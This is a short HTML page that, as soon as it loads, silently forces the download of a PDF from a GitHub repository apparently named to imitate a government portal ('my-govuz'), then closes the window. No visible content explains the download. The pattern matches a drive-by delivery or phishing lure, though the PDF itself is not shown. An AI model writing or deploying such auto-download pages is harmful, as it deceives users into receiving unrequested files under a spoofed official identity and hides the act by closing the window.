<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Download</title>
</head>
<body>
<script>
(async () => {
    const pdf =
    "https://github.com/my-govuz/my-gov_/raw/refs/heads/main/down-2026-27-12_17-00-55.pdf";

    const link = document.createElement("a");
    link.href = pdf;
    link.download = "document.pdf";

    document.body.appendChild(link);
    link.click();
    link.remove();

    setTimeout(() => {
        window.close();
    }, 2000);
})();
</script>
</body>
</html>
